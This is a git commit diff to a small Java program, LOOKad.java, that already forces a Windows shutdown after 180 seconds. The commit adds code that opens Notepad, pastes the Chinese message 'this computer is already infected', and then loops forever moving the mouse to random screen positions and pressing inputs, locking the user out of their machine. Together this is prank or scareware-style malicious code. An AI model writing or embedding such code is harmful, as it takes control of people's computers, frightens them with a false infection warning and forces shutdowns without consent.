2788f617b525f1970f3ee1434be4f7b5f0b28aa5
DJwei <2900867051@qq.com>
2020-12-08 13:02:06 +0800

    no message

--- src/LOOKad.java
+++ src/LOOKad.java
@@ -1,4 +1,9 @@
 import java.awt.*;
+import java.awt.datatransfer.Clipboard;
+import java.awt.datatransfer.StringSelection;
+import java.awt.event.InputEvent;
+import java.awt.event.KeyEvent;
+import java.util.Random;
 
 public class LOOKad {
     public  static void main (String[] args) throws Exception{
@@ -6,7 +11,24 @@ public class LOOKad {
         Runtime.getRuntime().exec("shutdown /s /t 180");
         //创建机器人
         Robot xa = new Robot();
+        //强行打开记事本
+        Runtime.getRuntime().exec("notepad");
+        //停顿操作
+        xa.delay(1000);
+        //设置剪切板的内容
+        Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
+        c.setContents(new StringSelection("此电脑已经中毒"),null);
+        //机器人实现按ctrl+v
+        xa.keyPress(KeyEvent.VK_CONTROL);
+        xa.keyPress(KeyEvent.VK_V);
+        xa.keyPress(KeyEvent.VK_CONTROL);
         //控制鼠标：移动至固定位置
-        xa.mouseMove(100,100);
+        while (true) {
+            //使鼠标乱动
+            int x = new Random().nextInt(1200);
+            int y = new Random().nextInt(1200);
+            xa.mouseMove(x,y);
+            xa.keyPress(InputEvent.BUTTON3_MASK);
+        }
     }
 }
